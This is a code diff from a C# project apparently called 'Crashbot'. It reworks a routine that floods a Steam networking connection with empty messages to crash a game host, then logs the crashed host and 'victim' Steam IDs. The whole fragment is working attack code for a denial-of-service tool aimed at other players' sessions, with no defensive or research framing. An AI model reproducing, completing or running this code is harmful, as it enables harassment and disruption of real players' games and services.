@@ -216,27 +216,24 @@ namespace Crashbot
 
                 // Wait for 1 msg or 2 seconds
                 CancellationTokenSource cancellationTokenSource = new();
-                Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new nint[1], 1), cancellationTokenSource.Token)
-                    .ContinueWith(_ =>
+
+                Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new nint[1], 1), cancellationTokenSource.Token).ContinueWith(_ =>
+                {
+                    for (int i = 0; i < FUN_TIME; i++)
                     {
-                        for (int i = 0; i < FUN_TIME; i++)
-                        {
-                            this.SteamThread.SendMessageToConnection(conn, 0, 0, 0);
-                            this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
-                            Task.Delay(20).Wait();
-                        }
+                        this.SteamThread.SendMessageToConnection(conn, 0, 0, 0);
+                        this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
+                        Task.Delay(20).Wait();
+                    }
 
-                        Task.Delay(500).Wait();
+                    mega_victim.OnVictimCrashed();
+                    Logger.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
 
-                        mega_victim.OnVictimCrashed();
-                        Logger.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
+                    while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally)
+                        this.SteamThread.GetConnectionInfo(conn, out info);
 
-                        SteamNetworkingSockets.CloseConnection(conn, 0, "Cancelled", false);
-                        SteamNetworkingSockets.ResetIdentity(ref remoteIdentity);
-                        SteamAPI.RunCallbacks();
-
-                        mega_victim.IsCrashing = false;
-                    });
+                    mega_victim.IsCrashing = false;
+                });
 
                 Task.Delay(5000).ContinueWith(_ => cancellationTokenSource.Cancel());
             }
